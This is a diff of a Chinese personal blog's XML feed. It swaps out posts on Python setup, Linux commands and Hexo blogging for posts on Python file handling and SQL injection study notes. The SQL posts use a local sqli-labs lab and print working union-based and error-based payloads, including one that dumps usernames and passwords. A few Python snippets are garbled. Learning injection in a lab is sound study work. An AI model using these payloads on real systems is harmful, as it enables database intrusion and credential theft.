-<p>点击链接下载python最新版本</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231203161844634.png" alt="image-20231203161844634"></p>
-<p>下载后点击安装：</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/4fe7fb7a95f941d5d7c06079c563899e.png" alt="img"></p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/f09156cac5de4301fc14f84da0654f2e.png" alt="img"></p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/57ff1575cde4ddfeb9c1697b3c7eb390.png" alt="img"></p>
-<p>在本地电脑输入命令提示符：win+R</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1ab2553654d102f6a8371f8fea5b7ed9.png" alt="img"></p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/fc81e83df580b7c6d7be15195f054407.png" alt="img"></p>
+        <h3 id="Python-文件操作详解"   >
+          <a href="#Python-文件操作详解" class="heading-link"><i class="fas fa-link"></i></a><a href="#Python-文件操作详解" class="headerlink" title="Python 文件操作详解"></a>Python 文件操作详解</h3>
+      <p>Python 提供了多种文件操作的工具，使得文件的读写和处理变得非常方便。以下是文件操作的一些关键概念和示例。</p>
 
-        <h1 id="2-python基础语法"   >
-          <a href="#2-python基础语法" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-python基础语法" class="headerlink" title="2.python基础语法"></a>2.python基础语法</h1>
-      
-        <h2 id="标识符"   >
-          <a href="#标识符" class="heading-link"><i class="fas fa-link"></i></a><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h2>
-      <ul>
-<li>第一个字符必须是字母表中字母或下划线 <strong>_</strong> 。</li>
-<li>标识符的其他的部分由字母、数字和下划线组成。</li>
-<li>标识符对大小写敏感。</li>
+        <h4 id="1-打开文件"   >
+          <a href="#1-打开文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-打开文件" class="headerlink" title="1. 打开文件"></a>1. 打开文件</h4>
+      <p>使用 <code>open()</code> 函数打开文件。语法如下：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">file = open(&#x27;filename&#x27;, &#x27;mode&#x27;)</span><br></pre></td></tr></table></div></figure>
+
+<ul>
+<li><code>&#39;filename&#39;</code>：要打开的文件名或路径。</li>
+<li><code>&#39;mode&#39;</code>：打开文件的模式，如 <code>&#39;r&#39;</code> 表示读取模式，<code>&#39;w&#39;</code> 表示写入模式，<code>&#39;a&#39;</code> 表示追加模式，<code>&#39;b&#39;</code> 表示二进制模式等。</li>
 </ul>
-<p>在 Python 3 中，可以用中文作为变量名，非 ASCII 标识符也是允许的了。</p>
-<hr>
 
-        <h2 id="python关键字"   >
-          <a href="#python关键字" class="heading-link"><i class="fas fa-link"></i></a><a href="#python关键字" class="headerlink" title="python关键字"></a>python关键字</h2>
-      <p>关键字，我们不能把它们用作任何标识符名称。Python 的标准库提供了一个 keyword 模块，可以输出当前版本的所有关键字：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; import keyword</span><br><span class="line">&gt;&gt;&gt; keyword.kwlist</span><br><span class="line">[&#x27;False&#x27;, &#x27;None&#x27;, &#x27;True&#x27;, &#x27;and&#x27;, &#x27;as&#x27;, &#x27;assert&#x27;, &#x27;break&#x27;, &#x27;class&#x27;, &#x27;continue&#x27;, &#x27;def&#x27;, &#x27;del&#x27;, &#x27;elif&#x27;, &#x27;else&#x27;, &#x27;except&#x27;, &#x27;finally&#x27;, &#x27;for&#x27;, &#x27;from&#x27;, &#x27;global&#x27;, &#x27;if&#x27;, &#x27;import&#x27;, &#x27;in&#x27;, &#x27;is&#x27;, &#x27;lambda&#x27;, &#x27;nonlocal&#x27;, &#x27;not&#x27;, &#x27;or&#x27;, &#x27;pass&#x27;, &#x27;raise&#x27;, &#x27;return&#x27;, &#x27;try&#x27;, &#x27;while&#x27;, &#x27;with&#x27;, &#x27;yield&#x27;]</span><br></pre></td></tr></table></div></figure>
+        <h4 id="2-读取文件"   >
+          <a href="#2-读取文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-读取文件" class="headerlink" title="2. 读取文件"></a>2. 读取文件</h4>
+      <p>使用不同的方法读取文件内容：</p>
+<p># 读取整个文件 </p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">with open(&#x27;example.txt&#x27;, &#x27;r&#x27;) as file:</span><br><span class="line"></span><br><span class="line">content = file.read()</span><br><span class="line"></span><br><span class="line">print(content)</span><br></pre></td></tr></table></div></figure>
 
-<hr>
+<p># 逐行读取文件</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">with open(&#x27;example.txt&#x27;, &#x27;r&#x27;) as file:</span><br><span class="line"></span><br><span class="line">lines = file.readlines()</span><br><span class="line"></span><br><span class="line">for line in lines: </span><br><span class="line"></span><br><span class="line">print(line)</span><br></pre></td></tr></table></div></figure>
 
-        <h2 id="注释"   >
-          <a href="#注释" class="heading-link"><i class="fas fa-link"></i></a><a href="#注释" class="headerlink" title="注释"></a>注释</h2>
-      <p>Python中单行注释以 <strong>#</strong> 开头，实例如下：</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231203163259585.png" alt="image-20231203163259585"></p>
-<p>执行以上代码，输出结果为：</p>
-<p>Hello Python！</p>
+
+
+
+        <h4 id="3-写入文件"   >
+          <a href="#3-写入文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-写入文件" class="headerlink" title="3. 写入文件"></a>3. 写入文件</h4>
+      <p># 写入整个文件</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">with open(&#x27;example.txt&#x27;, &#x27;w&#x27;) as file:</span><br><span class="line"></span><br><span class="line">file.write(&#x27;Hello, World!&#x27;)</span><br></pre></td></tr></table></div></figure>
+
+<p># 追加内容到文件</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">with open(&#x27;example.txt&#x27;, &#x27;a&#x27;) as file:</span><br><span class="line"></span><br><span class="line">file.write(&#x27;\nAppending more content.&#x27;)</span><br></pre></td></tr></table></div></figure>
+
+
+
+
+        <h4 id="4-文件迭代器"   >
+          <a href="#4-文件迭代器" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-文件迭代器" class="headerlink" title="4. 文件迭代器"></a>4. 文件迭代器</h4>
+      <p>使用 <code>for</code> 循环逐行读取文件：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">with open(&#x27;example.txt&#x27;, &#x27;r&#x27;) as file:</span><br><span class="line"></span><br><span class="line">for line in file:</span><br><span class="line"></span><br><span class="line">print(line)</span><br></pre></td></tr></table></div></figure>
+
+
+
+
+        <h4 id="5-关闭文件"   >
+          <a href="#5-关闭文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-关闭文件" class="headerlink" title="5. 关闭文件"></a>5. 关闭文件</h4>
+      <p>在使用 <code>open()</code> 打开文件后，使用 <code>close()</code> 方法关闭文件：</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="code"><pre><span class="line">codefile = <span class="built_in">open</span>(<span class="string">&#x27;example.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">content = file.read()</span><br><span class="line">file.close()</span><br></pre></td></tr></table></div></figure>
+
+
+        <h4 id="6-使用-with-语句"   >
+          <a href="#6-使用-with-语句" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-使用-with-语句" class="headerlink" title="6. 使用 with 语句"></a>6. 使用 <code>with</code> 语句</h4>
+      <p>使用 <code>with</code> 语句可以自动管理文件的打开和关闭，确保文件正确关闭：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">pythonCopy codewith open(&#x27;example.txt&#x27;, &#x27;r&#x27;) as file:</span><br><span class="line">    content = file.read()</span><br><span class="line">    # 在此处文件自动关闭</span><br></pre></td></tr></table></div></figure>
+
+
+        <h4 id="7-二进制文件操作"   >
+          <a href="#7-二进制文件操作" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-二进制文件操作" class="headerlink" title="7. 二进制文件操作"></a>7. 二进制文件操作</h4>
+      <p>读写二进制文件的示例：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">pythonCopy codewith open(&#x27;binary_file.bin&#x27;, &#x27;wb&#x27;) as file:</span><br><span class="line">    file.write(b&#x27;Binary data&#x27;)</span><br><span class="line"></span><br><span class="line">with open(&#x27;binary_file.bin&#x27;, &#x27;rb&#x27;) as file:</span><br><span class="line">    data = file.read()</span><br><span class="line">    print(data)</span><br></pre></td></tr></table></div></figure>
+
+
+        <h4 id="8-文件异常处理"   >
+          <a href="#8-文件异常处理" class="heading-link"><i class="fas fa-link"></i></a><a href="#8-文件异常处理" class="headerlink" title="8. 文件异常处理"></a>8. 文件异常处理</h4>
+      <p>在文件操作中添加异常处理，防止程序崩溃：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">pythonCopy codetry:</span><br><span class="line">    with open(&#x27;example.txt&#x27;, &#x27;r&#x27;) as file:</span><br><span class="line">        content = file.read()</span><br><span class="line">except FileNotFoundError:</span><br><span class="line">    print(&#x27;File not found!&#x27;)</span><br><span class="line">except Exception as e:</span><br><span class="line">    print(f&#x27;An error occurred: &#123;e</span><br></pre></td></tr></table></div></figure>
 ]]></content>
-      <tags>
-        <tag>python</tag>
-      </tags>
   </entry>
   <entry>
-    <title>Linux文件与目录，创建新用户</title>
-    <url>/2023/12/03/text4/</url>
+    <title>sql注入1</title>
+    <url>/2023/12/20/text16/</url>
     <content><![CDATA[
-        <h1 id="1-Linux-系统目录结构"   >
-          <a href="#1-Linux-系统目录结构" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-Linux-系统目录结构" class="headerlink" title="1.Linux 系统目录结构"></a>1.Linux 系统目录结构</h1>
-      <p>登录系统后，在当前命令窗口下输入命令：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">ls / </span><br></pre></td></tr></table></div></figure>
+        <h1 id="1-MySQL的一些语法知识"   >
+          <a href="#1-MySQL的一些语法知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-MySQL的一些语法知识" class="headerlink" title="1.MySQL的一些语法知识"></a>1.MySQL的一些语法知识</h1>
+      <p>– 选择所有列的所有行<br>SELECT * FROM users;</p>
+<p>– 选择特定列的所有行<br>SELECT username, email FROM users;</p>
+<p>– 添加 WHERE 子句，选择满足条件的行<br>SELECT * FROM users WHERE is_active &#x3D; TRUE;</p>
+<p>– 添加 ORDER BY 子句，按照某列的升序排序<br>SELECT * FROM users ORDER BY birthdate;</p>
+<p>– 添加 ORDER BY 子句，按照某列的降序排序<br>SELECT * FROM users ORDER BY birthdate DESC;</p>
+<p>– 添加 LIMIT 子句，限制返回的行数<br>SELECT * FROM users LIMIT 10;</p>
+<p> –等于条件</p>
+<p>SELECT * FROM users WHERE username &#x3D; ‘test’;</p>
+<p>–UNION 操作符：操作符用于连接两个以上的 SELECT 语句的结果组合到一个结果集合，并去除重复的行。</p>
+<p>SELECT city FROM customers UNION  SELECT city FROM suppliers  ORDER BY city;</p>
+<p>–GROUP_CONCAT：组内值连接成字符串的聚合函数。用于在分组的基础上将某个列的值连接成一个字符串。</p>
+<p>SELECT,GROUP_CONCAT(table_name) ,3 FROM information_schema.tables where table_schema&#x3D;database();</p>
+<p>SELECT GROUP_CONCAT(id,”<del>“,username,”</del>“,password) FROM users ;</p>
+<p>–select 123</p>
+<p><code>SELECT 123</code> 是一个简单的查询，它返回一个包含单个值 <code>123</code> 的结果集。<code>1</code> 和 <code>3</code> 是两个固定的常量，它们分别成为查询结果的两个列。它们没有实际的数据库含义，只是作为结果集的一部分而存在。</p>
 
-<p>你会看到如下图所示:</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/4_20.png" alt="img"></p>
-<p>树状目录结构：</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/d0c50-linux2bfile2bsystem2bhierarchy.jpg" alt="img"></p>
-<p>以下是对这些目录的解释：</p>
-<ul>
-<li><p><strong>&#x2F;bin</strong>：<br>bin 是 Binaries (二进制文件) 的缩写, 这个目录存放着最经常使用的命令。</p>
-</li>
-<li><p><strong>&#x2F;boot：</strong><br>这里存放的是启动 Linux 时使用的一些核心文件，包括一些连接文件以及镜像文件。</p>
-</li>
-<li><p><strong>&#x2F;dev ：</strong><br>dev 是 Device(设备) 的缩写, 该目录下存放的是 Linux 的外部设备，在 Linux 中访问设备的方式和访问文件的方式是相同的。</p>
-</li>
-<li><p><strong>&#x2F;etc：</strong><br>etc 是 Etcetera(等等) 的缩写,这个目录用来存放所有的系统管理所需要的配置文件和子目录。</p>
-</li>
-<li><p><strong>&#x2F;home</strong>：<br>用户的主目录，在 Linux 中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的，如上图中的 alice、bob 和 eve。</p>
-</li>
-<li><p><strong>&#x2F;lib</strong>：<br>lib 是 Library(库) 的缩写这个目录里存放着系统最基本的动态连接共享库，其作用类似于 Windows 里的 DLL 文件。几乎所有的应用程序都需要用到这些共享库。</p>
-</li>
-<li><p><strong>&#x2F;lost+found</strong>：<br>这个目录一般情况下是空的，当系统非法关机后，这里就存放了一些文件。</p>
-</li>
-<li><p><strong>&#x2F;media</strong>：<br>linux 系统会自动识别一些设备，例如U盘、光驱等等，当识别后，Linux 会把识别的设备挂载到这个目录下。</p>
-</li>
-<li><p><strong>&#x2F;mnt</strong>：<br>系统提供该目录是为了让用户临时挂载别的文件系统的，我们可以将光驱挂载在 &#x2F;mnt&#x2F; 上，然后进入该目录就可以查看光驱里的内容了。</p>
-</li>
-<li><p><strong>&#x2F;opt</strong>：<br>opt 是 optional(可选) 的缩写，这是给主机额外安装软件所摆放的目录。比如你安装一个ORACLE数据库则就可以放到这个目录下。默认是空的。</p>
-</li>
-<li><p><strong>&#x2F;proc</strong>：<br>proc 是 Processes(进程) 的缩写，&#x2F;proc 是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。<br>这个目录的内容不在硬盘上而是在内存里，我们也可以直接修改里面的某些文件，比如可以通过下面的命令来屏蔽主机的ping</p>
-</li>
-</ul>
-
-        <h1 id="2-Linux-文件与目录管理和创建新用户"   >
-          <a href="#2-Linux-文件与目录管理和创建新用户" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-Linux-文件与目录管理和创建新用户" class="headerlink" title="2.Linux 文件与目录管理和创建新用户"></a>2.Linux 文件与目录管理和创建新用户</h1>
-      <p>ls: 列出目录及文件名</p>
-<ul>
-<li>a ：全部的文件，连同隐藏文件( 开头为 . 的文件) 一起列出来(常用)</li>
-<li>-d ：仅列出目录本身，而不是列出目录内的文件数据(常用)</li>
-<li>-l ：长数据串列出，包含文件的属性与权限等等数据；(常用)</li>
-</ul>
-<p>cd：切换目录</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231203151412102.png" alt="image-20231203151412102">cd 绝对路径</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231203151531184.png" alt="image-20231203151531184">cd 相对路径</p>
-<p>pwd：显示目前的目录</p>
-<ul>
-<li><strong>-P</strong> ：显示出确实的路径，而非使用链接 (link) 路径。</li>
-</ul>
-<p>mkdir：创建一个新的目录</p>
-<p>   <img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231203152027323.png" alt="image-20231203152027323"></p>
-<ul>
-<li>-m ：配置文件的权限喔！直接配置，不需要看默认权限 (umask) 的脸色～</li>
-<li>-p ：帮助你直接将所需要的目录(包含上一级目录)递归创建起来！</li>
-</ul>
-<p>rmdir：删除一个空的目录</p>
-<p>​    <img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231203152125159.png" alt="image-20231203152125159"></p>
-<ul>
-<li><strong>-p ：</strong>从该目录起，一次删除多级空目录</li>
-</ul>
-<p>touch: 创建一个新的文件</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231203153414399.png"></p>
-<p>vi&#x2F;vim的使用</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231203153604813.png" alt="image-20231203153604813"></p>
-<p>按下 <strong>i</strong> 就进入了输入模式，使用 <strong>Esc</strong> 键可以返回到普通模式。</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231203153747054.png" alt="image-20231203153747054"></p>
-<p>在普通模式下按下 **:**（英文冒号）就进入了底行命令模式。</p>
-<p><img src="C:/Users/15386/AppData/Roaming/Typora/typora-user-images/image-20231203153921825.png" alt="image-20231203153921825"></p>
-<p>在底线命令模式中，基本的命令有</p>
-<ul>
-<li><code>:w</code>：保存文件。</li>
-<li><code>:q</code>：退出 Vim 编辑器。</li>
-<li><code>:wq</code>：保存文件并退出 Vim 编辑器。</li>
-<li><code>:q!</code>：强制退出Vim编辑器，不保存修改。</li>
-</ul>
-<p>useradd：创建新用户</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231203154159832.png" alt="image-20231203154159832"></p>
-<p>passwd：给用户设定更新密码</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231203154252280.png" alt="image-20231203154252280"></p>
+        <h1 id="2-SQL注入练习"   >
+          <a href="#2-SQL注入练习" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-SQL注入练习" class="headerlink" title="2.SQL注入练习"></a>2.SQL注入练习</h1>
+      <p>1.环境准备数据库和apache服务都要开，安装php5.59版本(版本过高有些内容无法使用)</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231220202023010.png" alt="image-20231220202023010"></p>
+<p>把sqli文件放在网站根目录，打开网站</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231220202331397.png" alt="image-20231220202331397"></p>
+<p>点击[Setup&#x2F;reset Database for labs]安装重置数据库文件，会出现如下页面代表能够进行注入练习</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231220202421678.png" alt="image-20231220202421678"></p>
+<p>安装Hackbar扩展，安装完成后按shift+f12能看到下方有Hackbar</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231220202855062.png" alt="image-20231220202855062"></p>
+<p>2.点击less1就能进入练习</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231220202932975.png" alt="image-20231220202932975"></p>
+<p>load url(加载本页链接可以在链接后面加注入语句)</p>
+<p>excute（执行链接）</p>
+<p>在 SQL 中，<code>--</code> 是注释符号，表示其后的文本将被视为注释而不被执行。当在 SQL 注入攻击中使用 <code>--</code> 时，目的是注释掉原始 SQL 语句的剩余部分，以防止它破坏注入 payload。</p>
+<p>通过？id&#x3D;1’– -注入成功登录如下图</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231220203801878.png" alt="image-20231220203801878"></p>
+<p>加入更多的数据查询语句获取更多信息：?id&#x3D;-1’union select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema&#x3D;database()– -</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231220204545237.png" alt="image-20231220204545237"></p>
+<p>?id&#x3D;-1’union select 1,group_concat(id,”<del>“,username,”</del>“,password),3 from users;– -</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231220204634420.png" alt="image-20231220204634420"></p>
 ]]></content>
-      <tags>
-        <tag>Linux</tag>
-      </tags>
   </entry>
   <entry>
-    <title>用Github部署图床</title>
-    <url>/2023/12/02/text3/</url>
-    <content><![CDATA[<p>1.下载安装Typora 链接:<span class="exturl"><a class="exturl__link"   href="https://typoraio.cn/" >https://typoraio.cn/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>2.下载安装PicGo 链接:<span class="exturl"><a class="exturl__link"   href="https://picgo.github.io/PicGo-Doc/zh/" >https://picgo.github.io/PicGo-Doc/zh/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>3.在GitHub上建立一个存放图片的仓库<br>4.打开GitHub个人账号的设置<br><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1701346883504-a688855f-91a6-4619-b16c-dc801659c7ea.png" alt="image.png"><br>5.打开开发者选项<br><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1701346931466-63a14f2d-eb0a-43f6-9427-4a8f81681492.png" alt="image.png"><br>6.生成token<br><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1701346995044-af188b21-351e-4998-b9ad-1e1aaf9339af.png" alt="image.png"><br>7.打开Pic Go图床设置Github编辑<br><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1701347133776-2525ec9b-d1fa-4199-908c-d19b773f428c.png" alt="image.png"><br>8.打开pytora验证，文件-偏好设置-图像<br><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1701347239890-3c00118f-2e10-4ce7-95cd-9378120de75f.png" alt="image.png"></p>
-]]></content>
-      <tags>
-        <tag>个人博客</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>用Github搭建个人博客</title>
-    <url>/2023/12/01/text2/</url>
-    <content><![CDATA[<ol>
-<li>提前安装好(node.js)<span class="exturl"><a class="exturl__link"   href="https://nodejs.org/en]" >[https://nodejs.org/en]</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 左边的那个</li>
-<li>提前安装好(GIt)<span class="exturl"><a class="exturl__link"   href="https://git-scm.com/downloads]" >[https://git-scm.com/downloads]</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li>
-<li>提前注册好一个github账号</li>
-<li>在本地找个目录放博客源文件，路径不要有中文</li>
-<li>在选定的目录中，打开cmd</li>
+    <title>SQL注入2</title>
+    <url>/2023/12/21/text17/</url>
+    <content><![CDATA[
+        <h1 id="1-postman使用"   >
+          <a href="#1-postman使用" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-postman使用" class="headerlink" title="1.postman使用"></a>1.postman使用</h1>
+      <p>1.进入火狐浏览器按shift+f12左下角网络在相应的页面发生请求可以获得网络活动信息可以找到对应的api请求</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231221193551394.png" alt="image-20231221193551394"></p>
+<p>2.点击new选择http将获取到的api链接放到上方地址栏根据实际情况选择GET还是其它请求点击send就能发送api请求</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231221192829536.png" alt="image-20231221192829536"></p>
+<p>3.在下方id一栏可以输入注入的sql语句后点击send就能执行注入获得数据库信息</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231221193745503.png" alt="image-20231221193745503"></p>
+
+        <h1 id="2-SQL注入之MySQL报错"   >
+          <a href="#2-SQL注入之MySQL报错" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-SQL注入之MySQL报错" class="headerlink" title="2.SQL注入之MySQL报错"></a>2.SQL注入之MySQL报错</h1>
+      <p>1.报错注入十大方法，依次是：</p>
+<p>（1）floor() 　　如：select * from test where id&#x3D;1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</p>
+<p>（2）extractvalue()　　如：select * from test where id&#x3D;1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</p>
+<p>（3）updatexml()　　如：select * from test where id&#x3D;1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</p>
+<p>（4）geometrycollection()　　如：select * from test where id&#x3D;1 and geometrycollection((select * from(select * from(select user())a)b));</p>
+<p>（5）multipoint()　　如：select * from test where id&#x3D;1 and multipoint((select * from(select * from(select user())a)b));</p>
+<p>（6）polygon()　　如：select * from test where id&#x3D;1 and polygon((select * from(select * from(select user())a)b));</p>
+<p>（7）multipolygon()　　如：select * from test where id&#x3D;1 and multipolygon((select * from(select * from(select user())a)b));</p>
+<p>（8）linestring()　　如：select * from test where id&#x3D;1 and linestring((select * from(select * from(select user())a)b));</p>
+<p>（9）multilinestring()　　如：select * from test where id&#x3D;1 and multilinestring((select * from(select * from(select user())a)b));</p>
+<p>（10）exp()　　如：select * from test where id&#x3D;1 and exp(~(select * from(select user())a));</p>
+<p>2.使用方法就是把select user部分语句换成自己想用来获取什么数据信息的语句</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231221201250317.png" alt="image-20231221201250317"></p>
+
+        <h1 id="3-sql注入介绍"   >
+          <a href="#3-sql注入介绍" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-sql注入介绍" class="headerlink" title="3.sql注入介绍"></a>3.sql注入介绍</h1>
+      <p>1.SQL注入用户通过浏览器或者其他客户端将恶意SQL语句插入到网站参数中，网站应用程序未经过过滤，将恶意SQL语句带入数据库进行执行，通过数据库获取了敏感的信息或者执行了其他恶意操作。</p>
+<p>2.SQL注入漏洞的成因：用户提交的参数数据未做充分检查过滤<br><span class="exturl"><a class="exturl__link"   href="http://www.any.com/index.jsp?username=admin&pass=pass" >http://www.any.com/index.jsp?username=admin&amp;pass=pass</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>3.SQL注入的危害：<br>（1）数据泄露：数据库中存放的用户的隐私信息的泄露。</p>
+<p>（2）网页篡改：通过操作数据库对特定网页进行篡改。</p>
+<p>（3）网站挂马：修改数据库一些字段的值嵌入网马链接，进行挂马攻击</p>
+<p>（4）服务器被远程控制：被安装后门。经由数据库服务器提供的操作系统支持让黑客得以修改或控制      操作系统。<br>（5）数据破坏：数据库服务器被攻击，数据库的系统管理员帐户被窜改系统瘫痪。</p>
+<p>4.SQL注入分类：</p>
+<p>（1）<strong>基于错误的注入（Error-Based SQL Injection）：</strong> 攻击者通过触发应用程序中的错误，从错误消息中获取敏感信息，或者利用错误来执行进一步的攻击。</p>
+<p>（2）<strong>联合查询注入（Union-Based SQL Injection）：</strong> 攻击者利用<code>UNION</code>语句将额外的数据行合并到查询结果中，通常用于提取其他表的信息。</p>
+<p>（3）<strong>时间盲注入（Time-Based Blind SQL Injection）：</strong> 攻击者通过向数据库引入延时函数，从而判断条件是否为真。这种注入方式常用于盲注入攻击，无法直接获取数据，但可以通过延时来确认注入点。</p>
+<p>（4）<strong>基于布尔的盲注入（Boolean-Based Blind SQL Injection）：</strong> 攻击者通过向数据库引入布尔条件，判断查询是否返回真或假，从而逐位地获取数据。</p>
+<p>（5）<strong>堆叠查询注入（Stacked Queries SQL Injection）：</strong> 攻击者在单个SQL查询中执行多个查询，从而实现复杂的数据库操作。</p>
+<p>（6）<strong>报错盲注入（Error-Based Blind SQL Injection）：</strong> 类似于基于错误的注入，但攻击者无法直接看到错误消息，而是通过观察应用程序的行为来判断注入是否成功。</p>
+<p>（7）<strong>UNION查询注入：</strong> 攻击者通过构造<code>UNION</code>语句将额外的数据行合并到查询结果中，从而获取其他表的信息。</p>
+<p>（8）<strong>注释符(#)绕过：</strong> 攻击者通过在注入点使用<code>#</code>符号来注释掉原有的SQL语句，从而绕过输入验证。</p>
+<p>（9）<strong>报错注入：</strong> 攻击者通过构造恶意的输入，使得数据库产生错误，从而获取敏感信息。</p>
+<p>（10）<strong>时间盲注入：</strong> 攻击者通过引入时间延迟，判断SQL查询条件是否为真，从而逐步获取数据。</p>
+<p>（11）<strong>Second-Order注入：</strong> 攻击者利用应用程序中存储的用户输入，使得后续的操作受到影响。</p>
+<p>5.SQL Injection函数</p>
+<p>user（)：当前用户名<br>database(）：当前所用数据库<br>current_user()：当前用户名（可用来查看权限)<br>version()：数据库的版本<br>@@datadir：数据库的路径<br>@@version_compile_os：操作系统版本<br>into dumpfile：写文件操作</p>
+<p>into outfile :写文件</p>
+<p>load_file()∶读文件操作</p>
+<p>concat(str1,str2..)∶连接字符串，连接两个或多个数组</p>
+<p>group_concat(str1,str2..)∶连接字符串，能将相同的行组合起来</p>
+<p>length ( ) &#x3D;&gt;计算字符串长度</p>
+<p>hex ( ) &#x3D;&gt;字符转换为16进制</p>
+<p>6.SQL注释</p>
+<ol>
+<li><strong>单行注释：</strong><ul>
+<li>单行注释以<code>--</code>开头，后面的内容将被视为注释。</li>
+<li>示例：<code>SELECT * FROM users WHERE username = &#39;admin&#39;; -- This is a comment</code></li>
+</ul>
+</li>
+<li><strong>多行注释：</strong><ul>
+<li>多行注释使用<code>/*</code>开头，以<code>*/</code>结尾，之间的内容将被视为注释。</li>
+<li>示例：</li>
+<li>&#x2F;*<br>   This is a multi-line comment<br>   It can span across multiple lines<br>   SELECT * FROM users WHERE username &#x3D; ‘admin’;<br>*&#x2F;</li>
+</ul>
+</li>
 </ol>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1701344628003-4a10e2c8-6b0c-4bf1-a346-ac20e52dc8ac.png" alt="image.png"><br>6.使用npm命令安装Hexo，输入</p>
-<p>npm install -g hexo-cli<br>hexo init blog<br>cd blog<br>hexo g</p>
-<p>构建好的效果:<img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1701344760454-e607748c-fe8a-489f-bbca-954b44fa7cf3.png" alt="image.png"><br>7.cd进入这个目录，分别按顺序输入以下三条命令就可以访问127.0.0.1:4000访问blog了</p>
-<p>hexo new test_my_site<br>hexo g<br> hexo s</p>
-<p>8.配置ssh</p>
-<p>cd ~&#x2F;.ssh #检查本机已存在的ssh密钥<br>ssh-keygen -t rsa -C “自己的邮箱地址”</p>
